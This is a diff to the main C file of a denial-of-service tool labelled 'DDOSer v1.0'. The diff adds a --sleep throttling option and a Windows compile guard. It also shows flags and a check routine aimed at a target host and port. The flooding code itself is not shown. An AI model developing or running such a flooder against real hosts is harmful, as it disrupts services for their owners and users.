@@ -6,6 +6,10 @@
 //  Copyright © 2017 Andre Zay. All rights reserved.
 //
 
+#ifdef WIN32
+#error Not compitable with Windows paltform
+#endif
+
 #include <stdbool.h>
 #include <time.h>
 
@@ -14,13 +18,15 @@
 #include "socket.h"
 
 bool socket_wait;
+bool _dos_sleep;
+int dos_sleep;
 
 int main(int argc, const char* argv[])
 {
     socket_wait = true;
     hide_warnings = false;
     srand(time(NULL));
-    info("DDOSer v1.0-beta by Andrewerr(http://github.com/Andrewerr)");
+    info("DDOSer v1.0 by Andrewerr(http://github.com/Andrewerr)");
 #ifdef DEBUG
     info("Starting in DEBUG mode");
 #endif
@@ -37,6 +43,14 @@ int main(int argc, const char* argv[])
         error("DEBUG:hostnam2ip(%s,%s)->%d,host=%s", _host, host, hostname2ip(_host, host), host);
 #endif
         return -1;
+    }
+    _dos_sleep=checklarg("--sleep",argv,argc);
+    if(_dos_sleep){
+        const char* RAW_SLEEP=getlarg("--sleep",argv,argc);
+        dos_sleep=atoi(RAW_SLEEP);
+    }
+    if(dos_sleep<0){
+        die("Invalid sleep argument");
     }
     int port = atoi(argv[2]);
     if (port < 0) {
@@ -64,7 +78,7 @@ int main(int argc, const char* argv[])
         error("Bad packet size!");
         return -1;
     }
-
+    
     if (!USE_HTTP) {
 #ifdef DEBUG
         info("Using random tcp packet");
@@ -95,6 +109,7 @@ int main(int argc, const char* argv[])
     hide_warnings = checklarg("--no-warnings", argv, argc);
     bool check = !checklarg("--no-check", argv, argc);
     socket_wait = !checklarg("--no-wait", argv, argc);
+    
     if (check) {
         info("Checking service");
         int sc = dos_tcp_sock(host, port);
